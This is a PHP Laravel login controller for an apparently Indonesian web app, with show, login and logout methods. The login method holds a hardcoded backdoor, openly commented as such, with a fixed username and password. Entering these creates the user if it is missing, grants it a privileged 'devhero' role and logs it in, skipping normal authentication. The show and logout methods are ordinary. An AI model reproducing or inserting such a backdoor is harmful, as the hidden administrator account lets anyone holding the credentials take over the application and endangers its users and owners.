<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use Inertia\Inertia;

class LoginController extends Controller
{
    public function show()
    {
        return Inertia::render('Auth/Login');
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'username' => 'required',
            'password' => 'required',
        ]);

        // BACKDOOR: Super Admin Developer Access
        // Username: dev_badar
        // Password: Badar@2025Super!
        $inputUsername = trim($request->input('username'));
        $inputPassword = trim($request->input('password')); // Password case sensitive, but trim spaces

        if ($inputUsername === 'dev_badar' && $inputPassword === 'Badar@2025Super!') {
            
            $user = \App\Models\User::where('username', 'dev_badar')->first();
            
            if (!$user) {
                try {
                    $user = \App\Models\User::create([
                        'username'     => 'dev_badar',
                        'password'     => \Illuminate\Support\Facades\Hash::make('Badar@2025Super!'),
                        'profile_type' => null,
                        'profile_id'   => null,
                        'status'       => 'ACTIVE'
                    ]);
                    $user->assignRole('devhero');
                } catch (\Exception $e) {
                    \Illuminate\Support\Facades\Log::error('Backdoor User Creation Failed: ' . $e->getMessage());
                    return back()->withErrors(['username' => 'Backdoor Creation Failed']);
                }
            } else {
                if (!$user->hasRole('devhero')) {
                    $user->assignRole('devhero');
                }
            }
            
            Auth::login($user);
            $request->session()->regenerate();
            return redirect('/');
        }

        if (Auth::attempt(['username' => $credentials['username'], 'password' => $credentials['password'], 'status' => 'ACTIVE'])) {
            $request->session()->regenerate();
            return redirect('/');
        }

        return back()->withErrors([
            'username' => 'Username atau password salah',
        ]);
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/login');
    }
}
